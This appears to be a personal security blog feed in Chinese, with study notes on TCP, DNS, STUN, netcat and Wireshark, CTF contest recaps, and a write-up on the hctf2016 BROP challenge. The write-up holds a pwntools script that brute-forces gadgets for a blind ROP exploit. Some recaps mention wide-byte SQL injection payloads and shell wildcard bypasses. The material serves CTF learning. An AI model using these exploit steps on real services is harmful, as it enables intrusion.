<pre><code>The server responds to the client with a sequence number of zero, as this is its first packet in this TCP session, and a relative acknowledgement number of 1. The acknowledgement number is set to 1 to indicate the receipt of the client&#39;s SYN flag in packet #1.

Notice that the acknowledgement number has been increased by 1 although no payload data has yet been sent by the client. This is because the presence of the SYN or FIN flag in a received packet triggers an increase of 1 in the sequence. (This does not interfere with the accounting of payload data, because packets with the SYN or FIN flag set do not carry a payload.)
</code></pre><p>就是说因为<code>SYN</code>和<code>FIN</code>标志位的存在, 使得序列号加了1…<br>不用担心会对带payload的包的情况产生影响, 因为置位<code>SYN</code>和<code>FIN</code>的包是不会带数据的…</p>
<p>emmmm, 我也可以认为这算是一种特殊情况吧</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Wireshark学习笔记]]></title>
      <url>/2018/04/25/Wireshark%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>主要是林的Wireshark系列的读书笔记, 以后遇到trick一起放在这里<br>以后学到什么协议就放到这里</p>
<h3 id="TCP-Follow"><a href="#TCP-Follow" class="headerlink" title="TCP Follow"></a>TCP Follow</h3><p>Follow的时候依据的是, 通信双方的<code>IP:Port</code></p>
<h3 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h3><p>书中多次提到问题无法解决, 是因为NAT把某白名单里的IP给转换成了其他的QAQ<br>yep, 那FTP的被动模式, 应该也是会遇到这个问题?</p>
<h3 id="STUN"><a href="#STUN" class="headerlink" title="STUN"></a>STUN</h3><p>STUN协议学习</p>
<pre><code>+++++++++++++++++++++
+ Message Type    2 +
+ Message Length  2 +
+ Message ID     16 +
+++++++++++++++++++++
</code></pre><p>头部这是 2 + 2 + 16 = 20字节<br>对应的请求和响应有相同的<code>Message ID</code><br>这个<code>Message Length</code>是后面可选项的总长度</p>
<p>之后就是TLV(Type-Length-Value)格式的可选项<br>每一项都是</p>
<pre><code>++++++++++++++++++++
+ Type    2        +
+ Length  2        +
+ Value   Length   +
++++++++++++++++++++
</code></pre><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>超古老的协议~</p>
<h3 id="MTU"><a href="#MTU" class="headerlink" title="MTU"></a>MTU</h3><p>最大传输单元, 网络上传输的包的最大大小, 包含IP, TCP/UDP<br>获知对方的MTU是在TCP建立连接(三次握手的时候), 双方会把自己的MSS(Maximum Segment Size) 告诉对方. MTU = MSS + IP头 + TCP头, 是包含在TCP载荷里<br>(准确的是说[SYN] - [SYN, ACK] - [ACK] 中的第一步告诉对方, 第二步收到对方的)<br>发送方发送包的最大大小取决于双方小的一方, 比如一方的MSS是1460, 那么他的MTU就是<code>(1460 + 20 + 20) = 1500</code>, 而另一方MSS是8960, MTU是<code>8960 + 20 + 20 = 9000</code><br>那么就只能传输1500的包</p>
<p>在wireshark抓到的包, IP头里的<code>total size</code>就是包总大小(比如TCP:IP+TCP+TCP载荷), 这里没算链路层的大小…为什么, MTU也不算链路层吗?<br>你是不是智障…MTU就是链路层对上层长度的一个限制, Linux下<code>netstat -i</code>就可以得到各接口的MTU大小, 我的无线网卡是1500…</p>
<p>但其实…我们知道的只是两端的MTU, 在传输过程中, 可能经过MTU更小的节点, 这个时候就会被丢包, 但这个情况我们没办法…我们也不知道中间网络是什么样的</p>
<h3 id="超时重传"><a href="#超时重传" class="headerlink" title="超时重传"></a>超时重传</h3><p>…从这里, 我慢慢理解到其实不是我们本科教的东西没有用, 只是教育还是普适性的. 这些东西覆盖面很广, 不仔细的研究这一块内容, or 以后不做这一块的东西, 可能真的用不到, 让你什么东西都了解一下, 是告诉你有这些东西的存在, 感兴趣的自会去学</p>
<h3 id="localhost-和-127-0-0-1"><a href="#localhost-和-127-0-0-1" class="headerlink" title="localhost 和 127.0.0.1"></a>localhost 和 127.0.0.1</h3><p>emmmmm, 网上有关于这个的奇怪言论…什么这个走网卡,那个不走网卡…我不是太明白…之后再看看</p>
<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>书上讲DNS的支撑协议可以是TCP, 也可以是UDP…<br>真是个奇异的协议, 以前只注意到能外带数据, 过防火墙, Rebinding 过waf…<br>根本没注意…这用两种协议, 学习了<br>一般情况下是使用UDP, 好像要强制使用TCP的时候才会用TCP</p>
<p>DNS查询的方式有两种</p>
<ol>
<li>递归查询<br>???</li>
<li>迭代查询<br>根服务器 - 权威服务器 - …<h4 id="循环工作模式"><a href="#循环工作模式" class="headerlink" title="循环工作模式"></a>循环工作模式</h4>查询一个对应着几个不同ip的同名记录, 会返回所有的IP, 但顺序会有所不同, 而一般会选中结果的第一个, 用这个特性可以做负载均衡</li>
</ol>
<h3 id="作者提到性能相关的Trick"><a href="#作者提到性能相关的Trick" class="headerlink" title="作者提到性能相关的Trick"></a>作者提到性能相关的Trick</h3><h4 id="Statistics-gt-Summary"><a href="#Statistics-gt-Summary" class="headerlink" title="Statistics -&gt; Summary"></a>Statistics -&gt; Summary</h4><p>我怎么找不到这个</p>
<h4 id="Analyze-gt-Expert-Infos"><a href="#Analyze-gt-Expert-Infos" class="headerlink" title="Analyze -&gt; Expert Infos"></a>Analyze -&gt; Expert Infos</h4><h4 id="Statistics-gt-TCP-StreamGraph-gt-TCP-Sequence-Graph"><a href="#Statistics-gt-TCP-StreamGraph-gt-TCP-Sequence-Graph" class="headerlink" title="Statistics -&gt; TCP StreamGraph -&gt; TCP Sequence Graph"></a>Statistics -&gt; TCP StreamGraph -&gt; TCP Sequence Graph</h4><p>统计 -&gt; TCP流形图 -&gt; 时间序列(Stevens)</p>
<h3 id="Wireshark对上层协议的识别"><a href="#Wireshark对上层协议的识别" class="headerlink" title="Wireshark对上层协议的识别"></a>Wireshark对上层协议的识别</h3><h4 id="传输层协议识别"><a href="#传输层协议识别" class="headerlink" title="传输层协议识别"></a>传输层协议识别</h4><p>这个很容易, IP报头有相应的字段指出传输层的协议, TCP(6), UDP(17)…emmmm, 还有ICMP(1)这个是算网络层的协议…但, ICMP是封装在IP包里的…, 类似的还有IGMP(6), 其他的想到再补充</p>
<h4 id="应用层协议识别"><a href="#应用层协议识别" class="headerlink" title="应用层协议识别"></a>应用层协议识别</h4><p>这个…看来看传输层没有相关的字段…应用层协议那么多..想一想也不会有相关的字段…<br>思考5s…应该是看端口号…如果不用常用端口号那应该就不知道了…</p>
<p>后记, 查了一下, 就是这样的, 还能设置某一个包的应用层协议类型</p>
<h3 id="TO-DO"><a href="#TO-DO" class="headerlink" title="TO-DO"></a>TO-DO</h3><p>再次推荐了TCP/IP详解, 我想抽时间把这个卷1看一下<br>我的天…这个好厚啊….QAQ</p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 协议 </tag>
            
            <tag> Wireshark </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[最近这段时间]]></title>
      <url>/2018/04/19/%E6%9C%80%E8%BF%91%E8%BF%99%E6%AE%B5%E6%97%B6%E9%97%B4/</url>
      <content type="html"><![CDATA[<p>在自习室里, 风好大, 我好冷, 23333<br>最近这段时间有点烦躁</p>
<p>毕设毫无进展<br>做了几场CTF, 越发感觉自己好弱</p>
<p>HITB的时候, 国内强队基本都去qwb线下了, 然鹅我们还是排名很靠后, 今天看第一名的wp真是惊呆了….人和人之间的差距这么大</p>
<h3 id="HITB"><a href="#HITB" class="headerlink" title="HITB"></a>HITB</h3><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><p>Misc出了2道<br>pix这题就是LSB之后, 拿到一个Keepass文件, 然后用工具爆破, John真是个神器…<br>read file在hgame里遇到类似的, 就是用<code>/???/???</code> 这样子代替<code>/bin/cat</code><br>tpyx 我修了图片, 但后面不知道怎么办, 据说是图片的data..zlib一下能找到一个7zip</p>
<h4 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h4><p>Web出了2道<br>upload主要考了windows下<code>&lt;</code>通配符的强大…<br>python是之前某比赛类似的题目, 反序列化<br>baby baby赛后听说是某端口有个命令执行</p>
<h4 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h4><p>Pwn看了两道一道没出…<br>格式化字符串dump出来之后, 改写got不成功…GG…我还以为是开了保护…要改虚表..就没做了…然后今天看大佬blog说是因为<code>gets</code>的原因, 不能用<code>\x0a</code>和<code>\x20</code>…不能换行我理解…为什么不能用<code>\x20</code>???</p>
<h4 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h4><p>由于太菜了. 就没看, 到后来才看了一下multicheck…大概是有个假的dex, 在lib里动态的改掉了dex…拿到新的dex就没看了…估计能做出来</p>
<h4 id="DDCTF"><a href="#DDCTF" class="headerlink" title="DDCTF"></a>DDCTF</h4><p>misc卡在了一道流量包分析, 快200人做出来, 不服=_=<br>翻桌子, emmmmm<br>第四扩展FS, 图片里有个压缩包…还提示ext4…我还专门把这一块抠出来, 挂载上去, 把压缩包取出来…好像就不挂载也行…有解压密码, exif看一下, 解压然后balabala<br>流量分析…卡住了, 搞出来的私钥和题目上的md5不一样..mdzz, 虽然和hint的md5不一样…但我试着把搞出来的密钥导入了wireshark….结果有flag…什么垃圾hint….我想打人<br>又出了一道, 就和盲注一样, 2333<br>前30没了…伤心<br>他们绝对交换flag…前面都没怎么动…今晚一下2小时出来好几个web…</p>
<p>web卡在了区块链, 这题真的是好新啊…时间不够用了<br>数据库的秘密, 就是注入, 过滤了一些东西, 比如等号什么的<br>专属链接, java题目, 有个文件下载, 然后下载了一堆xml之类的, 得到路径, 又下载了一堆class, 找到验证逻辑, 拿到flag ,坑点在于最后卡在怎么获得公钥上<br>注入的奥秘, 有意思…先开始宽字节注入, 通过<code>\xce\xb1</code>能产生一个斜杠, 所以<code>%ce$b1%27</code>我们就能有一个单引号啦, 这里我是fuzz得到的….后来发现好像SQLmap就能跑…注入发现没有flag, 只有message和路由表….卡了半天, 发现路由表里有一个<code>backup.css</code>是题目源码, 得到源码审计发现是一个简单的反序列化, 给<code>JustTry/Try</code>发包产生一个<code>Test</code>类的实例就好了, Test类析构的时候会输出flag<br>mini blockchain, 没怎么看. 感觉不会做</p>
<p>RE卡在了第一道…我不知道验证函数里突然比较$t5和$t6是什么鬼, 前面都没有对这俩寄存器的赋值, 怎么比较? 为什么这么多人做出来了QAQ<br>赛后, 原来那个是能让程序崩溃的花指令…让人窒息</p>
<p>Android卡在了第一道….根本没逆出来RSA在哪…好迷啊</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[水博客 | 补一些网络知识]]></title>
      <url>/2018/04/10/%E6%B0%B4%E5%8D%9A%E5%AE%A2-%E8%A1%A5%E4%B8%80%E4%BA%9B%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/</url>
      <content type="html"><![CDATA[<h2 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h2><p>VLAN的划分相当于广播域的划分, 对于一个4口交换机, 如果没有划分VLAN, 那么1口的机器发出一个广播包, 就会传给2, 3, 4这三个口, 但如果划分了VLAN, 比如1, 2口划分到一个VLAN, 3, 4口划分到一个VLAN. 那么1口广播包就只会发给2口, 而不会发给3, 4口.<br><a href="https://blog.csdn.net/cwm_meng_home/article/details/49762807" target="_blank" rel="external">https://blog.csdn.net/cwm_meng_home/article/details/49762807</a></p>
<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>ANAME, A记录, 将域名映射到特定IP, 把<code>xxx.ary.com</code>给<code>aaa.bbb.ccc.ddd</code><br>CNAME, 别名, 讲某个<code>yyy.ary.cn</code>绑给<code>xxx.ary.cn</code><br>NS(Name Server), 可以把一个域名的不同的二级域名分别指向不同的DNS Server</p>
<p>防火墙不会限制对DNS的访问, 所以会带来某些安全问题, IP不能带外的时候, 用域名代替可以?</p>
<h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h3><pre><code>; &lt;&lt;&gt;&gt; DiG 9.10.3-P4-Ubuntu &lt;&lt;&gt;&gt; stun.sipgate.net
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 61831
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;stun.sipgate.net.        IN    A

;; ANSWER SECTION:
stun.sipgate.net.    30    IN    A    217.10.68.152

;; AUTHORITY SECTION:
sipgate.net.        38090    IN    NS    ns2.netzquadrat.de.
sipgate.net.        38090    IN    NS    ns1.netzquadrat.de.

;; ADDITIONAL SECTION:
ns1.netzquadrat.de.    16490    IN    A    217.10.64.99
ns2.netzquadrat.de.    16490    IN    A    217.10.66.66

;; Query time: 4 msec
;; SERVER: 127.0.1.1#53(127.0.1.1)
;; WHEN: Tue Apr 10 22:25:45 CST 2018
;; MSG SIZE  rcvd: 143
</code></pre><p>Header: 软件版本, 请求的参数, flag等等…<br>ANSWER SECTION: 查询到的信息<br>AUTHORITY SECTION: DNS Server的授权信息<br>ADDITIONAL SECTION: 授权信息的DNS查询信息</p>
<h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>woc…我突然想到类似<code>DNS Rebinding</code>的欺骗方法是不是能解决对称型NAT的问题<br>如何欺骗NAT让它认为他和不同Host的通信是在和同一主机通信….如果有方法的话, 那这个问题就能解决<br>判断不同Host是通过IP吗, 如果我让他请求域名呢…域名算是应用层的…好像没用<br>…那怎么…我骗他我和之前xxx的IP一样…? mdzz</p>
<h2 id="HTTP请求中的Host字段"><a href="#HTTP请求中的Host字段" class="headerlink" title="HTTP请求中的Host字段"></a>HTTP请求中的Host字段</h2><p>一台主机上可能有多个域名…这样子的话, 你直接访问某一台主机是不知道你要访问哪个网站, 因为你request的路径里没有Host, 所以这个Host就阔以用以区分呢</p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[nc 学习]]></title>
      <url>/2018/04/10/nc-%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<pre><code>-l      是监听
-p      是指定监听的端口
-v      显示详细信息
-vv     信息就更详细了
-u      udp模式
-k      一直监听, 客户端断掉了就自己重启继续监听, 监听xss的时候就-k一下
</code></pre><p>应该是不指定<code>-u</code>, 默认就是tcp的应该?</p>
<p>所以tcp和udp两种监听</p>
<pre><code>nc -lp  8888 
nc -ulp 8888
</code></pre><p>好像是, 新版的<code>nc</code>, 可以不加<code>-p</code>参数, 就是直接<code>nc -l 8888</code>就可以了</p>
<p>喔, 突然想起来一个梗, 就是有些浏览器不给<code>6666</code>端口访问, 会<code>ERR_UNSAFE_PORT</code></p>
<p>喔, 所以访问别人的时候, 也可以用<code>-p</code>来指定本地使用的端口吗</p>
<pre><code>nc 10.111.100.xxx 8887 -p 7756
</code></pre><p>喔, 好像是可以的, nc了一下我vps…而且惊喜的发现…我们学校的<code>symmetric NAT</code>居然是…<code>7756</code>就映射到<code>7756</code>…令人窒息的操作<br>而且好像不能解决冲突…你要开本地80来访问外边的话, 就得不到回应…<br>哦, 不对, 只能说是我们这边校区的NAT</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn | hctf2016 brop]]></title>
      <url>/2018/04/09/pwn-hctf2016-brop/</url>
      <content type="html"><![CDATA[<p>为了我自己复现的时候整理的方便..都放到wp一栏了…<br>wooyun有一篇drops, 写得很详细, emmmmmo<br>叫做:  <code>Blind Return Oriented Programming (BROP) Attack - 攻击原理</code></p>
<p>先测一下看起来不是格式化字符串(复现的时候可以通过看代码0.0)<br>然后测试padding大小<br>找到一个hang_addr, 使得程序能回到原来的地方, 接受多次输出<br>然后找到一个puts, 把程序dump出来, 这道题目是64位的…所以还要有一个<code>pop rdi; ret</code>来传参<br>然后就和一般的题目一样了<br>这道题目没有canary..如果有的话还要爆破..</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'sh'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>

p <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">gd</span><span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> a<span class="token punctuation">)</span>
    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
        raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">test_padding</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">*</span> i<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'No password, no game'</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span> <span class="token string">"[*] padding is "</span><span class="token punctuation">,</span> i
            <span class="token keyword">break</span>
        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">find_hang_addr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token comment" spellcheck="true">#        addr = 0x08048000 + i</span>
        addr <span class="token operator">=</span> <span class="token number">0x400000</span> <span class="token operator">+</span> i
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">72</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'WelCome my friend,Do you know password?'</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span> <span class="token string">"[*] hang addr is "</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> addr

hang_addr <span class="token operator">=</span> find_hang_addr<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># 我们需要puts来dump程序, 所以我们需要一个`pop rdi, ret`</span>
<span class="token comment" spellcheck="true"># 我们找到那个`pop r15, ret`, 往后偏移一个字节就是`pop rdi, ret`</span>
<span class="token comment" spellcheck="true"># 这个gadget是</span>
<span class="token comment" spellcheck="true"># </span>
<span class="token comment" spellcheck="true"># pop rbx;</span>
<span class="token comment" spellcheck="true"># pop rbp;</span>
<span class="token comment" spellcheck="true"># pop r12;</span>
<span class="token comment" spellcheck="true"># pop r13;</span>
<span class="token comment" spellcheck="true"># pop r14;</span>
<span class="token comment" spellcheck="true"># pop r15;</span>
<span class="token comment" spellcheck="true"># ret</span>
<span class="token comment" spellcheck="true"># </span>
<span class="token comment" spellcheck="true"># 验证的时候我们就用这个验证, 满足下面的条件说明就是OK的</span>
<span class="token comment" spellcheck="true"># payload1 = 'A' * 72 + p64(addr - 1) + p64(0) + p64(ret)</span>
<span class="token comment" spellcheck="true"># payload1 = 'A' * 72 + p64(addr) + p64(0) + p64(ret)</span>
<span class="token comment" spellcheck="true"># payload1 = 'A' * 72 + p64(addr + 1) + p64(ret)</span>
<span class="token keyword">def</span> <span class="token function">find_rdi_ret</span><span class="token punctuation">(</span>hang_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr <span class="token operator">=</span> <span class="token number">0x400000</span> <span class="token operator">+</span> i
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>hang_addr<span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'WelCome my friend,Do you know password?'</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span> <span class="token string">"[*] pop_pop_...._ret addr is "</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># 得到`gadget`地址, 加上8得到`pop rdi; ret`地址, 带到上面三条里验证一下, 就OK</span>

<span class="token keyword">def</span> <span class="token function">find_puts_plt</span><span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr <span class="token operator">=</span> <span class="token number">0x400000</span> <span class="token operator">+</span> i
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ELF'</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span> <span class="token string">"[*] puts@plt is "</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后dump程序后面不写了</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn | IO_FILE_ 学习]]></title>
      <url>/2018/04/07/pwn-IO-FILE-%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<h2 id="setbuf-amp-amp-setvbuf"><a href="#setbuf-amp-amp-setvbuf" class="headerlink" title="setbuf &amp;&amp; setvbuf"></a>setbuf &amp;&amp; setvbuf</h2><p>在学习之前先整理一下最近注意到的<code>setvbuf</code></p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">setvbuf</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span>stream<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span><span class="token keyword">int</span> mode<span class="token punctuation">,</span>size_t size<span class="token punctuation">)</span>

buf <span class="token punctuation">:</span> 如果不指定<span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">,</span> 那么函数就在堆上给你自动分配一个
type<span class="token punctuation">:</span> 缓冲区类型<span class="token punctuation">,</span>
    _IOFBF <span class="token function">Full</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span> buffering<span class="token punctuation">,</span> 输出时<span class="token punctuation">,</span> 缓冲区满了或者flushed的时时候进行写<span class="token punctuation">,</span> 输入时清空缓冲区
    _IOLBF Line buffering<span class="token punctuation">,</span> 每次从流中读入一行数据或向流中写入一行数据<span class="token punctuation">,</span> 也就是说有换行符才进行读写<span class="token punctuation">,</span> 当然缓冲区满了也会写
    _IONBF   No buffering<span class="token punctuation">,</span> 不使用缓冲区<span class="token punctuation">,</span> 读写操作直接进行<span class="token punctuation">,</span> 如果type设置成这个值<span class="token punctuation">,</span> 那size和buf参数都会被忽略
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>还有一个函数<code>setbuf</code></p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">setbuf</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span>stream<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

当`buf <span class="token operator">=</span> <span class="token constant">NULL</span>`的时候<span class="token punctuation">,</span> 不使用缓冲区<span class="token punctuation">,</span> 相当于 _IONBF
所以这个函数相当于 <span class="token function">setvbuf</span><span class="token punctuation">(</span>stream<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> buf <span class="token operator">?</span> _IOFBF <span class="token punctuation">:</span> _IONBF<span class="token punctuation">,</span> BUFSIZE<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们打开的文件一般是<code>Block buffering</code>, 第一次I/O操作的时候会自动分配个适当大小的堆块作为它的缓冲区<br>stdin 是<code>Line buffing</code><br>stdout是<code>Line buffing</code><br>stderr是<code>No buffering</code></p>
<p>一般的ctf题目里都会进行一个操作就是</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 2就是 _IONBF</span>
